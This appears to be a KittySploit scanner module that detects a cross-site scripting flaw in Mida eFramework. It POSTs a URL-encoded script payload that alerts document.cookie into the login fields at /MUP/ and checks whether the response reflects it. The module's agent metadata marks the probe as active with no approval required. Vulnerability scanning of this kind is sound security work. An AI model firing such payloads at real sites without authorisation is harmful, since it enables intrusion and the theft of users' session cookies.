#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Mida eFramework contains a cross-site scripting vulnerability."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Mida eFramework - Cross-Site Scripting Detection',
        'description': 'Mida eFramework contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'mida', 'xss', 'edb', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://www.exploit-db.com/exploits/48768'],
    }

    def run(self):
        path = '/MUP/'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded', 'Referer': '{{Hostname}}/MUP'}, data='UPusername=%22%3E%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E&UPpassword=%22%3E%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('"><script>javascript:alert(document.cookie)</script>',)
        if any(m in body for m in body_any):
            self.set_info(severity='high', reason='Mida eFramework - Cross-Site Scripting detected', path=path)
            return True
        return False

